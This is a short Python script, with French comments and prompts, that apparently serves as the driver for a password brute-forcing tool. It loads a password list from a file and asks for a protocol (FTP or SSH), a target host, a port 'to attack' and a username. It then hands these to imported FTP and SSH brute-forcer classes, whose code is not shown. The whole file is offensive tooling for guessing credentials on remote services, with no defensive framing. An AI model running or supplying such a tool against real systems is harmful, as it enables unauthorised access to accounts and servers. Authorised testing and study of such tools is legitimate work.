from bruteforce_ftp import FTPBruteForcer
from bruteforce_ssh import SSHBruteForcer

def password_file(file_name):
    password_list = []
    try:
        with open(file_name, 'r') as file:
            for line in file:
                password_list.append(line.strip())
    except FileNotFoundError:
        print("Erreur : Le fichier spécifié n'existe pas.")
    except Exception as ex:
        print("Erreur : ", ex)
    return password_list

def main():
    try:
        # Récupérer les paramètres d'entrée de l'utilisateur
        protocol = input("Choisir le protocole (FTP ou SSH): ").upper()

        # Demander le nom du fichier contenant les mots de passe
        file_name = input("Entrez le nom du fichier avec les mots de passe : ")

        # Charger la liste de mots de passe à partir du fichier
        password_list = password_file(file_name)

        if not password_list:
            return

        if protocol == "SSH":
            host = input("Entrez l'hôte cible : ")
            port = int(input("Entrez le port à attaquer : "))
            username = input("Entrez le nom d'utilisateur : ")
            ssh_brute_forcer = SSHBruteForcer(host, port, username, password_list)
            ssh_brute_forcer.brute_force()
        elif protocol == "FTP":
            host = input("Entrez l'hôte cible : ")
            port = int(input("Entrez le port à attaquer : "))
            username = input("Entrez le nom d'utilisateur : ")
            ftp_brute_forcer = FTPBruteForcer(host, port, username, password_list)
            ftp_brute_forcer.brute_force()
        else:
            print("Protocole Invalide !")
        
    except Exception as ex:
        print("L'erreur %s" % ex)
        

if __name__ == "__main__":
    main()
